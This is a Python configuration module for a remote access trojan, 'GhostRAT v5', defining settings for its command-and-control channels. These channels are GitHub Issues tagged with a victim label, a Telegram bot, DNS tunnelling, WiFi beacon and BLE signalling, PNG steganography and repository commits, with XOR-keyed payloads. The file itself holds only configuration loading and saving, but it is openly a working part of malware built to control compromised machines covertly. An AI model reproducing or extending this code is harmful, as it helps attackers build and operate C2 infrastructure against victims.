"""
GhostRAT v5 — C2 Configuration
================================

Central configuration class for all C2 channels.

Loads from environment variables or JSON config file.
"""

import json
import logging
import os
from dataclasses import dataclass, field
from typing import Optional

logger = logging.getLogger("GhostRATv5.C2Config")


@dataclass
class C2Config:
    """
    Unified C2 configuration for all GhostRAT v5 channels.

    Attributes:
        github_repo_owner: GitHub repository owner/organization
        github_repo_name: GitHub repository name
        github_token: GitHub personal access token (PAT)
        telegram_bot_token: Telegram bot API token
        telegram_chat_id: Telegram chat ID for command results
        crypto_key: XOR encryption key for command/result payloads
        wifi_ssid_prefix: WiFi beacon SSID prefix for encoding commands
        ble_adv_interval: BLE advertising interval in milliseconds
        dns_subdomain: DNS subdomain prefix for tunneling commands
        png_metadata_key: PNG tEXt chunk key for steganographic commands
        commands_file_path: Path to commands.json for API commit C2
    """

    # GitHub Issues
    github_repo_owner: str = ""
    github_repo_name: str = ""
    github_token: str = ""

    # Telegram
    telegram_bot_token: str = ""
    telegram_chat_id: int = 0

    # Crypto
    crypto_key: str = "GHOSTRATV5"

    # WiFi Beacon
    wifi_ssid_prefix: str = "GHOST-"

    # BLE Advertising
    ble_adv_interval: int = 100

    # DNS Tunnel
    dns_subdomain: str = "cmd"

    # PNG Stego
    png_metadata_key: str = "Author"

    # API Commit C2
    commands_file_path: str = "commands.json"

    # GitHub Issues label for victim issues
    victim_label: str = "ghostrat-v5"

    # Poll interval in seconds
    poll_interval: int = 30

    # Max retries on rate-limit
    max_retries: int = 3

    # Retry backoff factor (seconds)
    retry_backoff: float = 2.0

    @classmethod
    def load_from_env(cls) -> "C2Config":
        """
        Load configuration from environment variables.

        Environment variables:
            GHOST_GITHUB_REPO_OWNER  — GitHub repo owner
            GHOST_GITHUB_REPO_NAME   — GitHub repo name
            GHOST_GITHUB_TOKEN       — GitHub PAT
            GHOST_TELEGRAM_BOT_TOKEN — Telegram bot token
            GHOST_TELEGRAM_CHAT_ID   — Telegram chat ID
            GHOST_CRYPTO_KEY         — XOR encryption key
            GHOST_WIFI_SSID_PREFIX   — WiFi beacon prefix
            GHOST_BLE_ADV_INTERVAL   — BLE advertising interval (ms)
            GHOST_DNS_SUBDOMAIN      — DNS tunnel subdomain
            GHOST_PNG_METADATA_KEY   — PNG stego metadata key
            GHOST_COMMANDS_FILE_PATH — API commit commands file path
            GHOST_POLL_INTERVAL      — Poll interval (seconds)
            GHOST_MAX_RETRIES        — Max retry count
            GHOST_RETRY_BACKOFF      — Retry backoff (seconds)

        Returns:
            C2Config instance populated from environment.
        """
        return cls(
            github_repo_owner=os.getenv("GHOST_GITHUB_REPO_OWNER", ""),
            github_repo_name=os.getenv("GHOST_GITHUB_REPO_NAME", ""),
            github_token=os.getenv("GHOST_GITHUB_TOKEN", ""),
            telegram_bot_token=os.getenv("GHOST_TELEGRAM_BOT_TOKEN", ""),
            telegram_chat_id=int(os.getenv("GHOST_TELEGRAM_CHAT_ID", "0") or "0"),
            crypto_key=os.getenv("GHOST_CRYPTO_KEY", "GHOSTRATV5"),
            wifi_ssid_prefix=os.getenv("GHOST_WIFI_SSID_PREFIX", "GHOST-"),
            ble_adv_interval=int(os.getenv("GHOST_BLE_ADV_INTERVAL", "100") or "100"),
            dns_subdomain=os.getenv("GHOST_DNS_SUBDOMAIN", "cmd"),
            png_metadata_key=os.getenv("GHOST_PNG_METADATA_KEY", "Author"),
            commands_file_path=os.getenv("GHOST_COMMANDS_FILE_PATH", "commands.json"),
            poll_interval=int(os.getenv("GHOST_POLL_INTERVAL", "30") or "30"),
            max_retries=int(os.getenv("GHOST_MAX_RETRIES", "3") or "3"),
            retry_backoff=float(os.getenv("GHOST_RETRY_BACKOFF", "2.0") or "2.0"),
        )

    @classmethod
    def load_from_file(cls, path: str) -> "C2Config":
        """
        Load configuration from a JSON config file.

        Args:
            path: Path to the JSON config file.

        Returns:
            C2Config instance populated from the file.

        Raises:
            FileNotFoundError: If the config file does not exist.
            ValueError: If the config file has invalid structure.
        """
        if not os.path.isfile(path):
            raise FileNotFoundError(f"Config file not found: {path}")

        with open(path, "r", encoding="utf-8") as fh:
            raw = json.load(fh)

        try:
            github = raw.get("github", {})
            telegram = raw.get("telegram", {})
            crypto = raw.get("crypto", {})
            wifi = raw.get("wifi", {})
            ble = raw.get("ble", {})
            dns = raw.get("dns", {})
            png = raw.get("png", {})
            api_commit = raw.get("api_commit", {})

            return cls(
                github_repo_owner=github.get("repo_owner", ""),
                github_repo_name=github.get("repo_name", ""),
                github_token=github.get("token", ""),
                telegram_bot_token=telegram.get("bot_token", ""),
                telegram_chat_id=int(telegram.get("chat_id", 0) or 0),
                crypto_key=crypto.get("key", "GHOSTRATV5"),
                wifi_ssid_prefix=wifi.get("ssid_prefix", "GHOST-"),
                ble_adv_interval=int(ble.get("adv_interval_ms", 100) or 100),
                dns_subdomain=dns.get("subdomain", "cmd"),
                png_metadata_key=png.get("metadata_key", "Author"),
                commands_file_path=api_commit.get("file_path", "commands.json"),
            )
        except (KeyError, TypeError) as exc:
            raise ValueError(f"Invalid config file structure: {exc}") from exc

    def to_dict(self) -> dict:
        """Serialize config to a plain dict."""
        return {
            "github": {
                "repo_owner": self.github_repo_owner,
                "repo_name": self.github_repo_name,
                "token": self.github_token,
            },
            "telegram": {
                "bot_token": self.telegram_bot_token,
                "chat_id": self.telegram_chat_id,
            },
            "crypto": {
                "key": self.crypto_key,
            },
            "wifi": {
                "ssid_prefix": self.wifi_ssid_prefix,
            },
            "ble": {
                "adv_interval_ms": self.ble_adv_interval,
            },
            "dns": {
                "subdomain": self.dns_subdomain,
            },
            "png": {
                "metadata_key": self.png_metadata_key,
            },
            "api_commit": {
                "file_path": self.commands_file_path,
            },
        }

    def save_to_file(self, path: str) -> None:
        """
        Save config to a JSON file.

        Args:
            path: Destination file path.
        """
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(self.to_dict(), fh, indent=2)
        logger.info("Config saved to %s", path)

    @property
    def github_base_url(self) -> str:
        """GitHub API base URL."""
        return "https://api.github.com"

    @property
    def repo_url(self) -> str:
        """Full repository path (owner/repo) used in API URLs."""
        return f"{self.github_repo_owner}/{self.github_repo_name}"

    @property
    def has_github(self) -> bool:
        """Whether GitHub C2 is configured."""
        return bool(self.github_repo_owner and self.github_repo_name and self.github_token)

    @property
    def has_telegram(self) -> bool:
        """Whether Telegram C2 is configured."""
        return bool(self.telegram_bot_token and self.telegram_chat_id)
